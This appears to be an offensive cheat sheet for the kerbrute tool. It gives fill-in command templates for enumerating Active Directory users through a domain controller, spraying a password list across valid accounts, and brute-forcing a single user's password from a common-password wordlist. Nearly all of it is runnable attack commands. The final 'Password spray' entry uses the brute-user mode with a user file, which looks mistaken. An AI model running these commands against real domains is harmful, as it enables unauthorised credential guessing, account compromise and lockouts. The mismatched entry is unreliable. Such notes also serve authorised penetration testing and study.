# kerbrute
#plateform/linux #target/remote #cat/ATTACK

## Test userlist
```
/opt/kerbrute/dist/kerbrute_linux_386 userenum -d <domain> --dc <target> <usersfile|test_users.txt>
```

## Passwords spray passwords list
```
while IFS= read -r password; do /opt/kerbrute/dist/kerbrute_linux_386 passwordspray -d <domain> --dc <target> <userslist|valid_users.txt> $password --downgrade; done < <passwordslist|passwords.txt>
```

## Bruteforce user
```
/opt/kerbrute/dist/kerbrute_linux_386 bruteuser -d <domain> --dc <target> <wordlist|/usr/share/seclists/Passwords/2020-200_most_used_passwords.txt> <user> --downgrade
```

## Password spray
```
/opt/kerbrute/dist/kerbrute_linux_386 bruteuser -d <domain> --dc <target> <usersfile|valid_users.txt> <passwd> --downgrade
```
